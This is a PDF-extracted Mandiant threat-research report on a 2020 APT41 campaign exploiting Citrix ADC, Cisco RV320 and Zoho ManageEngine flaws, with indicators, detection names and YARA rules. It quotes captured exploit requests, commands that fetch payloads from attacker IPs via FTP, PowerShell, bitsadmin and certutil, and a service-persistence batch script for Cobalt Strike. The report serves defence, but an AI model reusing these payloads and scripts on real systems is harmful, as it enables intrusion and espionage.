{
    "title": "APT41 Initiates Intrusion Campaign Using Multiple Exploits",
    "text": "01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 1 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploitsBeginning this year, FireEye observed Chinese actor APT41 carry out one of the broadestcampaigns by a Chinese cyber espionage actor we have observed in recent years. BetweenJanuary 20 and March 11, FireEye observed APT41 attempt to exploit vulnerabilities in CitrixNetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central at over 75 FireEyeThis Is Not a Test: APT41Initiates Global IntrusionCampaign Using MultipleExploitsCHRISTOPHER GLYER, DAN PEREZ, SARAH JONES, STEVE MILLER#ADV ANCED PERSISTENT THREATS (APTS)#THREAT RESEARCH THREAT RESEARCHMAR 25, 2020|12 MIN READ|   LAST UPDA TED: AUG 10, 2023 BlogSupportContact us/report_problemIncident Response AssistanceGet startedPlatformSolutionsIntelligenceServicesResourcesCompanyEN/expand_moreMandiant is now part of Google Cloud. Learn More. mandiant.com uses cookies from Google to deliver andenhance the quality of its services and to analyze tra!c. Learn 01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 2 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits customers. Countries we’ve seen targeted include Australia, Canada, Denmark, Finland, France,India, Italy, Japan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore,Sweden, Switzerland, UAE, UK and USA. The following industries were targeted:Banking/Finance, Construction, Defense Industrial Base, Government, Healthcare, HighTechnology, Higher Education, Legal, Manufacturing, Media, Non-proﬁt, Oil & Gas,Petrochemical, Pharmaceutical, Real Estate, Telecommunications, Transportation, Travel, andUtility. It’s unclear if APT41 scanned the Internet and attempted exploitation en masse orselected a subset of speciﬁc organizations to target, but the victims appear to be moretargeted in nature.Exploitation of CVE-2019-19781 (Citrix Application Delivery Controller [ADC])Starting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits ofCitrix Application Delivery Controller (ADC) and Citrix Gateway devices with CVE-2019-19781(published December 17, 2019). Figure 1: Timeline of key eventsThe initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involvedexecution of the command ‘ﬁle /bin/pwd’, which may have achieved two objectives for APT41.First, it would conﬁrm whether the system was vulnerable and the mitigation wasn’t applied.Second, it may return architecture-related information that would be required knowledge forAPT41 to successfully deploy a backdoor in a follow-up step.  One interesting thing to note is that all observed requests were only performed against Citrixdevices, suggesting APT41 was operating with an already-known list of identiﬁed devicesaccessible on the internet.POST /vpns/portal/scripts/newbm.pl HTTP/1.1Host: [redacted]Connection: closeAccept-Encoding: gzip, deﬂateAccept: */*User-Agent: python-requests/2.22.0 more. OK, got it01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 3 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits NSC_NONCE: nsrootNSC_USER: ../../../netscaler/portal/templates/[redacted]Content-Length: 96url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print ` ﬁle /bin/pwd` ') %]Figure 2: Example APT41 HTTP tra\"c exploiting CVE-2019-19781There is a lull in APT41 activity between January 23 and February 1, which is likely related to theChinese Lunar New Year holidays which occurred between January 24 and January 30, 2020.This has been a common activity pattern by Chinese APT groups in past years as well.Starting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads thatinitiate a download via the File Transfer Protocol (FTP). Speciﬁcally, APT41 executed thecommand ‘/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]\\@66.42.98[.]220/bsd’, whichconnected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server with a usernameof ‘test’ and a password that we have redacted, and then downloaded an unknown payloadnamed ‘bsd’ (which was likely a backdoor).POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1Accept-Encoding: identityContent-Length: 147Connection: closeNsc_User: ../../../netscaler/portal/templates/[redacted]User-Agent: Python-urllib/2.7Nsc_Nonce: nsrootHost: [redacted]Content-Type: application/x-www-form-urlencodedurl=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print ` /usr/bin/ftp -o/tmp/bsd ftp://test:[redacted]\\@66.42.98[.]220/bsd` ') %]Figure 3: Example APT41 HTTP tra\"c exploiting CVE-2019-19781We did not observe APT41 activity at FireEye customers between February 2 and February 19,2020. China initiated COVID-19 related quarantines in cities in Hubei province starting onJanuary 23 and January 24, and rolled out quarantines to additional provinces starting betweenFebruary 2 and February 10. While it is possible that this reduction in activity might be related tothe COVID-19 quarantine measures in China, APT41 may have remained active in other ways,which we were unable to observe with FireEye telemetry. We observed a signiﬁcant uptick inCVE-2019-19781 exploitation on February 24 and February 25. The exploit behavior was almostidentical to the activity on February 1, where only the name of the payload ‘un’ changed.POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1Accept-Encoding: identityContent-Length: 14501/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 4 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits Connection: closeNsc_User: ../../../netscaler/portal/templates/[redacted]User-Agent: Python-urllib/2.7Nsc_Nonce: nsrootHost: [redacted]Content-Type: application/x-www-form-urlencodedurl=http://example.com&title= [redacted]&desc=[% template.new('BLOCK' = 'print ` /usr/bin/ftp -o/tmp/un ftp://test:[redacted]\\@66.42.98[.]220/un` ') %]Figure 4: Example APT41 HTTP tra\"c exploiting CVE-2019-19781Citrix released a mitigation for CVE-2019-19781 on December 17, 2019, and as of January 24,2020, released permanent ﬁxes for all supported versions of Citrix ADC, Gateway, and SD-WANWANOP.Cisco Router ExploitationOn February 21, 2020, APT41 successfully exploited a Cisco RV320 router at atelecommunications organization and downloaded a 32-bit ELF binary payload compiled for a64-bit MIPS processor named ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknownwhat speciﬁc exploit was used, but there is a Metasploit module that combines two CVE’s (CVE-2019-1653 and CVE-2019-1652) to enable remote code execution on Cisco RV320 and RV325small business routers and uses wget to download the speciﬁed payload.GET /test/fucHTTP/1.1Host: 66.42.98\\.220User-Agent: WgetConnection: closeFigure 5: Example HTTP request showing Cisco RV320 router downloading a payload via wget66.42.98[.]220 also hosted a ﬁle name http://66.42.98[.]220/test/1.txt. The content of 1.txt(MD5:  c0c467c8e9b2046d7053642cc9bdd57d) is ‘cat /etc/ﬂash/etc/nk_sysconﬁg’, which is thecommand one would execute on a Cisco RV320 router to display the current conﬁguration.Cisco PSIRT conﬁrmed that ﬁxed software to address the noted vulnerabilities is available andasks customers to review the following security advisories and take appropriate action:Cisco Small Business RV320 and RV325 Routers Information Disclosure VulnerabilityCisco Small Business RV320 and RV325 Routers Command Injection VulnerabilityExploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability)01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 5 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits On March 5, 2020, researcher Steven Seeley, published an advisory and released proof-of-concept code for a zero-day remote code execution vulnerability in Zoho ManageEngineDesktop Central versions prior to 10.0.474 (CVE-2020-10189). Beginning on March 8, FireEyeobserved APT41 use 91.208.184[.]78 to attempt to exploit the Zoho ManageEngine vulnerabilityat more than a dozen FireEye customers, which resulted in the compromise of at least ﬁveseparate customers. FireEye observed two separate variations of how the payloads (install.batand storesyncsvc.dll) were deployed. In the ﬁrst variation the CVE-2020-10189 exploit was usedto directly upload “logger.zip”, a simple Java based program, which contained a set ofcommands to use PowerShell to download and execute install.bat and storesyncsvc.dll.java/lang/RuntimegetRuntime()Ljava/lang/Runtime;Xcmd /c powershell $client = new-objectSystem.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\\Windows\\Temp\\install.bat')&powershell $client = new-objectSystem.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll','C:\\Windows\\Temp\\storesyncsvc.dll')&C:\\Windows\\Temp\\install.bat'(Ljava/lang/String;)Ljava/lang/Process;StackMapTableysoserial/Pwner76328858520609Lysoserial/Pwner76328858520609;Figure 6: Contents of logger.zipHere we see a toolmark from the tool ysoserial that was used to create the payload in the POC.The string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likelyused the POC as source material in their operation.In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41infrastructure 66.42.98[.]220 on port 12345.Parent Process: C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exeProcess Arguments: cmd /c bitsadmin /transfer bbbb http://66.42.98[.]220:12345/test/install.batC:\\Users\\Public\\install.batFigure 7: Example FireEye Endpoint Security event depicting successful CVE-2020-10189exploitationIn both variations, the install.bat batch ﬁle was used to install persistence for a trial-version ofCobalt Strike BEACON loader named storesyncsvc.dll (MD5:5909983db4d9023e4098e56361c96a6f).01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 6 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits @echo offset \"WORK_DIR=C:\\Windows\\System32\"set \"DLL_NAME=storesyncsvc.dll\"set \"SERVICE_NAME=StorSyncSvc\"set \"DISPLAY_NAME=Storage Sync Service\"set \"DESCRIPTION=The Storage Sync Service is the top-level resource for File Sync. It creates syncrelationships with multiple storage accounts via multiple sync groups. If this service is stopped ordisabled, applications will be unable to run collectly.\" sc stop %SERVICE_NAME%sc delete %SERVICE_NAME%mkdir %WORK_DIR%copy \"%~dp0%DLL_NAME%\" \"%WORK_DIR%\" /Yreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v \"%SERVICE_NAME%\" /tREG_MULTI_SZ /d \"%SERVICE_NAME%\" /fsc create \"%SERVICE_NAME%\" binPath= \"%SystemRoot%\\system32\\svchost.exe -k %SERVICE_NAME%\"type= share start= auto error= ignore DisplayName= \"%DISPLAY_NAME%\"SC failure \"%SERVICE_NAME%\" reset= 86400 actions= restart/60000/restart/60000/restart/60000sc description \"%SERVICE_NAME%\" \"%DESCRIPTION%\"reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\" /freg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\" /v \"ServiceDll\" /tREG_EXPAND_SZ /d \"%WORK_DIR%\\%DLL_NAME%\" /fnet start \"%SERVICE_NAME%\"Figure 8: Contents of install.batStoresyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected toexchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleablecommand and control (C2) proﬁle.GET /jquery-3.3.1.min.js HTTP/1.1Host: cdn.bootcss.comAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Referer: http://cdn.bootcss.com/Accept-Encoding: gzip, deﬂateCookie: __cfduid=CdkIb8kXFOR_9Mn48DQwhIEuIEgn2VGDa_XZK_xAN47OjPNRMpJawYvnAhPJYMDA8y_rXEJQGZ6Xlkp_wCoqnImD-bj4DqdTNbj87Rl1kIvZbefE3nmNunlyMJZTrDZfu4EV6oxB8yKMJfLXydC5YF9OeZwqBSs3Tun12BVFWLIUser-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like GeckoConnection: Keep-Alive Cache-Control: no-cacheFigure 9: Example APT41 Cobalt Strike BEACON jquery malleable C2 proﬁle HTTP requestWithin a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor todownload a secondary backdoor with a different C2 address that uses Microsoft CertUtil, acommon TTP that we’ve observed APT41 use in past intrusions, which they then used todownload 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The ﬁle 2.exe was a VMProtectedMeterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage ofVMProtected binaries is another very common TTP that we’ve observed this group leverage inmultiple intrusions in order to delay analysis of other tools in their toolkit.01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 7 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits GET /2.exe HTTP/1.1Cache-Control: no-cacheConnection: Keep-AlivePragma: no-cacheAccept: */*User-Agent: Microsoft-CryptoAPI/6.3Host: 91.208.184[.]78Figure 10: Example HTTP request downloading ‘2.exe’ VMProtected Meterpreter downloader viaCertUtilcertutil  -urlcache -split -f http://91.208.184[.]78/2.exeFigure 11: Example CertUtil command to download ‘2.exe’ VMProtected Meterpreter downloaderThe Meterpreter downloader ‘TzGG’ was conﬁgured to communicate with 91.208.184[.]78 overport 443 to download the shellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for CobaltStrike BEACON (trial-version).GET /TzGG HTTP/1.1User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)Host: 91.208.184[.]78:443Connection: Keep-AliveCache-Control: no-cacheFigure 12: Example HTTP request downloading ‘TzGG’ shellcode for Cobalt Strike BEACONThe downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78. Webelieve this is an example of the actor attempting to diversify post-exploitation access to thecompromised systems.ManageEngine released a short term mitigation for CVE-2020-10189 on January 20, 2020, andsubsequently released an update on March 7, 2020, with a long term ﬁx.OutlookThis activity is one of the most widespread campaigns we have seen from China-nexusespionage actors in recent years. While APT41 has previously conducted activity with anextensive initial entry such as the trojanizing of NetSarang software, this scanning andexploitation has focused on a subset of our customers, and seems to reveal a high operationaltempo and wide collection requirements for APT41.It is notable that we have only seen these exploitation attempts leverage publicly available01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 8 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits malware such as Cobalt Strike and Meterpreter. While these backdoors are full featured, inprevious incidents APT41 has waited to deploy more advanced malware until they have fullyunderstood where they were and carried out some initial reconnaissance. In 2020, APT41continues to be one of the most proliﬁc threats that FireEye currently tracks. This new activityfrom this group shows how resourceful and how quickly they can leverage newly disclosedvulnerabilities to their advantage.Previously, FireEye Mandiant Managed Defense identiﬁed APT41 successfully leverage CVE-2019-3396 (Atlassian Conﬂuence) against a U.S. based university. While APT41 is a unique state-sponsored Chinese threat group that conducts espionage, the actor also conducts ﬁnanciallymotivated activity for personal gain.IndicatorsTypeIndicator(s)CVE-2019-19781 Exploitation(Citrix Application DeliveryControl)66.42.98[.]220CVE-2019-19781 exploitation attempts with a payload of ‘ﬁle/bin/pwd’CVE-2019-19781 exploitation attempts with a payload of ‘/usr/bin/ftp-o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/bsd’CVE-2019-19781 exploitation attempts with a payload of ‘/usr/bin/ftp-o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/un’/tmp/bsd/tmp/unCisco Router Exploitation66.42.98\\.220‘1.txt’ (MD5:  c0c467c8e9b2046d7053642cc9bdd57d)‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc CVE-2020-10189 (ZohoManageEngine Desktop Central)66.42.98[.]22091.208.184[.]7874.82.201[.]8exchange.dumb1[.]cominstall.bat (MD5: 7966c2c546b71e800397a67f942858d0)storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f)C:\\Windows\\Temp\\storesyncsvc.dllC:\\Windows\\Temp\\install.bat2.exe (MD5: 3e856162c36b532925c8226b4ed3481c)C:\\Users\\[redacted]\\install.batTzGG (MD5: 659bd19b562059f3f0cc978e15624fd9)C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exespawning cmd.exe and/or bitsadmin.exeCertutil.exe downloading 2.exe and/or payloads from 91.208.184[.]78PowerShell downloading ﬁles with Net.WebClientDetecting the Techniques01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 9 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits FireEye detects this activity across our platforms. This table contains several speciﬁcdetection names from a larger list of detections that were available prior to this activityoccurring.PlatformSignature NameEndpoint Security BITSADMIN.EXE MULTISTAGE DOWNLOADER (METHODOLOGY)CERTUTIL.EXE DOWNLOADER A (UTILITY)Generic.mg.5909983db4d9023eGeneric.mg.3e856162c36b5329POWERSHELL DOWNLOADER (METHODOLOGY)SUSPICIOUS BITSADMIN USAGE B (METHODOLOGY)SAMWELL (BACKDOOR)SUSPICIOUS CODE EXECUTION FROM ZOHO MANAGE ENGINE (EXPLOIT)Network SecurityBackdoor.MeterpreterDTI.CallbackExploit.CitrixNetScalerTrojan.METASTAGEExploit.ZohoManageEngine.CVE-2020-10198.PwnerExploit.ZohoManageEngine.CVE-2020-10198.mdmLogUploaderHelixCITRIX ADC [Suspicious Commands] EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Attempt] EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Success] EXPLOIT - CITRIX ADC [CVE-2019-19781 Payload Access] EXPLOIT - CITRIX ADC [CVE-2019-19781 Scanning] MALWARE METHODOLOGY [Certutil User-Agent] WINDOWS METHODOLOGY [BITSadmin Transfer] WINDOWS METHODOLOGY [Certutil Downloader]MITRE ATT&CK Technique MappingATT&CKTechniquesInitialAccessExternal Remote Services (T1133), Exploit Public-Facing Application (T1190)ExecutionPowerShell (T1086), Scripting (T1064)PersistenceNew Service (T1050) PrivilegeEscalationExploitation for Privilege Escalation (T1068) DefenseEvasionBITS Jobs (T1197), Process Injection (T1055)  01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 10 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits CommandAnd ControlRemote File Copy (T1105), Commonly Used Port (T1436), Uncommonly Used Port (T1065),Custom Command and Control Protocol (T1094), Data Encoding (T1132), StandardApplication Layer Protocol (T1071)Appendix A: Discovery RulesThe following Yara rules serve as examples of discovery rules for APT41 actor TTPs, turning theadversary methods or tradecraft into new haystacks for purposes of detection or hunting. Forall tradecraft-based discovery rules, we recommend deliberate testing and tuning prior toimplementation in any production system. Some of these rules are tailored to build concisehaystacks that are easy to review for high-ﬁdelity detections. Some of these rules are broad inaperture that build larger haystacks for further automation or processing in threat huntingsystems.import \"pe\"rule ExportEngine_APT41_Loader_String{            meta:                        author = \"@stvemillertime\"                        description \"This looks for a common APT41 Export DLL name in BEACON shellcode loaders, such asloader_X86_svchost.dll\"            strings:                        $pcre = /loader_[\\x00-\\x7F]{1,}\\x00/            condition:                        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre atpe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address)+ 12))}rule ExportEngine_ShortName{    meta:        author = \"@stvemillertime\"        description = \"This looks for Win PEs where Export DLL name is a single character\"    strings:        $pcre = /[A-Za-z0-9]{1}\\.(dll|exe|dat|bin|sys)/    condition:        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre atpe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address)+ 12))}rule ExportEngine_xArch{    meta:        author = \"@stvemillertime\"        description = \"This looks for Win PEs where Export DLL name is a something like x32.dat\"            strings:             $pcre = /[\\x00-\\x7F]{1,}x(32|64|86)\\.dat\\x00/            condition:             uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre atpe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address)+ 12))}01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 11 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits rule RareEquities_LibTomCrypt{    meta:        author = \"@stvemillertime\"        description = \"This looks for executables with strings from LibTomCrypt as seen by some APT41-esque actorshttps://github.com/libtom/libtomcrypt - might catch everything BEACON as well. You may want to exclude Golang andUPX packed samples.\"    strings:        $a1 = \"LibTomMath\"    condition:        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $a1}rule RareEquities_KCP{    meta:        author = \"@stvemillertime\"        description = \"This is a wide catchall rule looking for executables with equities for a transport library called KCP,https://github.com/skywind3000/kcp Matches on this rule may have built-in KCP transport ability.\"    strings:        $a01 = \"[RO] %ld bytes\"        $a02 = \"recv sn=%lu\"        $a03 = \"[RI] %d bytes\"        $a04 = \"input ack: sn=%lu rtt=%ld rto=%ld\"        $a05 = \"input psh: sn=%lu ts=%lu\"        $a06 = \"input probe\"        $a07 = \"input wins: %lu\"        $a08 = \"rcv_nxt=%lu\\\\n\"        $a09 = \"snd(buf=%d, queue=%d)\\\\n\"        $a10 = \"rcv(buf=%d, queue=%d)\\\\n\"        $a11 = \"rcvbuf\"    condition:        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and ﬁlesize < 5MB and 3 of ($a*)}rule ConventionEngine_Term_Users{            meta:                        author = \"@stvemillertime\"                        description = \"Searching for PE ﬁles with PDB path keywords, terms or anomalies.\"                        sample_md5 = \"09e4e6fa85b802c46bc121fcaecc5666\"                        ref_blog = \"https://www.ﬁreeye.com/blog/threat-research/2019/08/deﬁnitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\"            strings:                        $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}Users[\\x00-\\xFF]{0,200}\\.pdb\\x00/ nocaseascii            condition:                        (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre}rule ConventionEngine_Term_Desktop{            meta:                        author = \"@stvemillertime\"                        description = \"Searching for PE ﬁles with PDB path keywords, terms or anomalies.\"                        sample_md5 = \"71cdba3859ca8bd03c1e996a790c04f9\"                        ref_blog = \"https://www.ﬁreeye.com/blog/threat-research/2019/08/deﬁnitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\"            strings:                        $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}Desktop[\\x00-\\xFF]{0,200}\\.pdb\\x00/ nocase01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 12 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits ascii            condition:                        (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre}rule ConventionEngine_Anomaly_MultiPDB_Double{            meta:                        author = \"@stvemillertime\"                        description = \"Searching for PE ﬁles with PDB path keywords, terms or anomalies.\"                        sample_md5 = \"013f3bde3f1022b6cf3f2e541d19353c\"                        ref_blog = \"https://www.ﬁreeye.com/blog/threat-research/2019/08/deﬁnitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\"            strings:                        $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}\\.pdb\\x00/            condition:                        (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and #pcre == 2}Link to RSS feedPrepare for2024'scybersecuritylandscape. Download nowGet the Google CloudCybersecurity Forecast 2024repo! to explore the latesttrends on the horizon.01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 13 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploits Havequestions?Let's talk.Mandiantexperts areready toanswer yourquestions.Contactus Follow us01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 14 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploitsMandiant AdvantagePlatformPlatform OverviewSecurity ValidationAttack SurfaceManagementThreat IntelligenceDigital ThreatMonitoringManaged DefenseSolutionsProactive ExposureManagementRansomwareIndustrial Controls &OTCyber RiskManagementDigital RiskProtectionInsider ThreatsCyber Security SkillsGapElection SecurityGovernment CyberSecurityManufacturingCyber Threat VisibilityAttack SurfaceVisibilityCyber PreparednessDetection andResponseFinancial ServicesCyber SecurityServicesServices OverviewIncident ResponseStrategic ReadinessCyber SecurityTransformationTechnical AssuranceView all Services (48)Expertise on DemandMandiant AcademyOverviewEducation FormatsUpcoming CoursesOn-Demand CoursesCertiﬁcationsThreatSpace CyberRangeFree Course SneakPeaks ResourcesResource CenterBlogPodcastsCompanyAbout UsCareersEventsPartnersPartners OverviewTechnology PartnersCyber Risk PartnersConnect withMandiantContact UsReport an IncidentCustomer Support01/04/24, 21:02APT41 Initiates Intrusion Campaign Using Multiple Exploits Pagina 15 di 15https://www.mandiant.com/resources/blog/apt41-initiates-global-intrusion-campaign-using-multiple-exploitsCustomer StoriesReportsWebinarsInsightseBooksInfographicsWhite PapersDatasheetsMedia CenterService PartnersPartner PortalCustomer SuccessMedia Inquiries   Copyright 2024 Mandiant. All rights reserved.Website Privacy PolicyTerms & ConditionsComplianceSite Map"
}